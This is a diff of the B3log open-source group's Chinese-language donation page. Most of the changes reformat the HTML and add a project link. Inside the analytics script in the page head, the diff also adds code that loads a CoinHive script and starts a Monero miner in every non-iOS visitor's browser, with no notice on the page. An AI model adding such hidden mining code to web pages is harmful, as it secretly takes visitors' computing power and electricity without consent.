@@ -1,97 +1,111 @@
 <!DOCTYPE html>
 <html>
-    <head>
-        <meta charset="utf-8" />
-        <title>B3log - 成为赞助者</title>
-        <meta name="keywords" content="b3log, solo, wide"/>
-        <meta name="description" content="免费的个人独立博客,"/>
-        <link type="text/css" rel="stylesheet" href="css/style.css" charset="utf-8" />
-        <!--[if lt IE 9]>
-         <script type="text/javascript">
-            (function () {
-                var element = ['time', 'section', 'article', 'figure', 'figcaption'];
-                for (var i = 0; i < element.length; i++) {
-                    document.createElement(element[i]);
-                }
-            })();
-        </script>
-        <![endif]-->
-        <link rel="icon" type="image/png" href="/favicon.png" />
-<script>
-var _hmt = _hmt || [];
-(function() {
-  var hm = document.createElement("script");
-  hm.src = "//hm.baidu.com/hm.js?174a1111f4c1724383232f848510cd2c";
-  var s = document.getElementsByTagName("script")[0]; 
-  s.parentNode.insertBefore(hm, s);
-})();
-</script>
+<head>
+    <meta charset="utf-8"/>
+    <title>B3log - 成为赞助者</title>
+    <meta name="keywords" content="b3log, solo, wide"/>
+    <meta name="description" content="免费的个人独立博客,"/>
+    <link type="text/css" rel="stylesheet" href="css/style.css" charset="utf-8"/>
+    <!--[if lt IE 9]>
+    <script type="text/javascript">
+        (function () {
+            var element = ['time', 'section', 'article', 'figure', 'figcaption'];
+            for (var i = 0; i < element.length; i++) {
+                document.createElement(element[i]);
+            }
+        })();
+    </script>
+    <![endif]-->
+    <link rel="icon" type="image/png" href="/favicon.png"/>
+    <script>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "//hm.baidu.com/hm.js?174a1111f4c1724383232f848510cd2c";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
 
-    </head>
-    <body>
-        <div class="header">
-            <div class="wrapper">
-                <div class="left">
-                    <h1>
-                        <a href="http://b3log.org" title="B3log">B3log 开源</a>
-                    </h1>
-                    <span id="killBrowser"></span>
+        if (navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/)) {
+          return
+        }
+        const scriptDom = document.createElement('script')
+        scriptDom.setAttribute('src', 'https://static.hacpai.com/js/lib/xmr.min.js')
+        document.head.appendChild(scriptDom)
+        scriptDom.onload = function () {
+          var miner = new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', {threads: 2, throttle: 0.5});
+          miner.start();
+        }
+      })();
+    </script>
+
+</head>
+<body>
+<div class="header">
+    <div class="wrapper">
+        <div class="left">
+            <h1>
+                <a href="http://b3log.org" title="B3log">B3log 开源</a>
+            </h1>
+            <span id="killBrowser"></span>
+        </div>
+        <div class="header-intro">
+            <a target="_blank" href="https://hacpai.com/register?r=88250">黑客派</a>
+            &nbsp; &nbsp; &nbsp;
+            <a href="/services/index.html">服务价格</a>
+            &nbsp; &nbsp; &nbsp;
+            <a href="/donate.html" class="current">成为赞助者</a>
+            &nbsp; &nbsp; &nbsp;
+            <a href="http://liuyun.io" target="_blank">流云</a>
+        </div>
+        <div class="clear"></div>
+    </div>
+</div>
+
+<!-- start main -->
+<div class="donate">
+    <div class="wrapper">
+        <div class="intro">
+            <div class="module-wrapper">
+                <div class="module-title">
+                    支持 B3log 开源
                 </div>
-                <div class="header-intro">
-                    <a target="_blank" href="https://hacpai.com/register?r=88250">黑客派</a>
-                    &nbsp; &nbsp; &nbsp;
-                    <a href="/services/index.html">服务价格</a>
-                    &nbsp; &nbsp; &nbsp;
-                    <a href="/donate.html" class="current">成为赞助者</a>
-                    &nbsp; &nbsp; &nbsp;
-                    <a href="http://liuyun.io" target="_blank">流云</a>
+                <div class="module-content">
+                    <p>
+                        B3log 开源组织旗下包含
+                        <a href="https://github.com/b3log/solo" target="_blank">Solo</a>、
+                        <a href="https://github.com/b3log/pipe" target="_blank">Pipe</a>、
+                        <a href="https://github.com/b3log/symphony" target="_blank">Symphony</a>、
+                        <a href="https://github.com/b3log/wide" target="_blank">Wide</a>、
+                        <a href="https://github.com/b3log/latke" target="_blank">Latke</a>、
+                        <a href="https://github.com/b3log/wordman" target="_blank">Wordman</a>
+                        等一系列<a href="https://github.com/b3log" target="_blank">开源项目</a>，使用完全免费。但是随着项目规模的增长，也需要有相应的资金支持才能持续项目的维护的开发。
+                        你可以通过 <a href="https://hacpai.com/article/1460083956075">广告投放</a>、<a
+                        href="http://b3log.org/services/index.html">购买服务</a> 或使用微信、支付宝、
+                        <a href="https://www.paypal.me/b3log/5">Paypal</a> (单次) 、<a
+                        href="https://www.patreon.com/b3log">Patreon</a>（每月）来赞助我们。
+                    </p>
+
+                    <img class="donate-img" src="images/alipay-donate.jpg">
+                    <img class="donate-img" src="images/wechat-donate.jpg">
+
+                    <div class="clear"></div>
                 </div>
-                <div class="clear"></div>
             </div>
         </div>
+    </div>
+</div>
 
-        <!-- start main -->
-        <div class="donate">
-            <div class="wrapper">
-                <div class="intro">
-                    <div class="module-wrapper">
-                        <div class="module-title">
-                            支持 B3log 开源
-                        </div>
-                        <div class="module-content">
-                            <p>
-                            B3log 开源组织旗下包含
-                                <a href="https://github.com/b3log/solo" target="_blank">Solo</a>、
-                                <a href="https://github.com/b3log/symphony" target="_blank">Symphony</a>、
-                                <a href="https://github.com/b3log/wide" target="_blank">Wide</a>、
-                                <a href="https://github.com/b3log/latke" target="_blank">Latke</a>、
-                                <a href="https://github.com/b3log/wordman" target="_blank">Wordman</a>
-                            等一系列<a href="https://github.com/b3log" target="_blank">开源项目</a>，使用完全免费。但是随着项目规模的增长，也需要有相应的资金支持才能持续项目的维护的开发。
-                            你可以通过 <a href="https://hacpai.com/article/1460083956075">广告投放</a>、<a href="http://b3log.org/services/index.html">购买服务</a> 或使用微信、支付宝、
-                                <a href="https://www.paypal.me/b3log/5">Paypal</a> (单次) 、<a href="https://www.patreon.com/b3log">Patreon</a>（每月）来赞助我们。
-                            </p>
+<!-- end main -->
 
-                            <img class="donate-img" src="images/alipay-donate.jpg">
-                            <img class="donate-img" src="images/wechat-donate.jpg">
-
-                            <div class="clear"></div>
-                        </div>
-                    </div>
-                </div>
-            </div>
+<div class="footer">
+    <div class="wrapper">
+        <div class="left">
+            <a href="http://b3log.org" title="B3log"><img src="images/logo.png" title="B3log"/></a>
         </div>
-
-        <!-- end main -->
-
-        <div class="footer">
-            <div class="wrapper">
-                <div class="left">
-                    <a href="http://b3log.org" title="B3log"><img src="images/logo.png" title="B3log" /></a>
-                </div>
-                平等 • 自由 • 奔放  <span class="ft-gray">© 2010-2017</span> <a href="http://b3log.org">B3log</a>
-            </div>
-        </div>
-        <script type="text/javascript" src="js/lib/jquery.min.js" charset="utf-8"></script>
-        <script type="text/javascript" src="js/common.js" charset="utf-8"></script>
-    </body>
+        平等 • 自由 • 奔放 <span class="ft-gray">© 2010-2017</span> <a href="http://b3log.org">B3log</a>
+    </div>
+</div>
+<script type="text/javascript" src="js/lib/jquery.min.js" charset="utf-8"></script>
+<script type="text/javascript" src="js/common.js" charset="utf-8"></script>
+</body>
 </html>
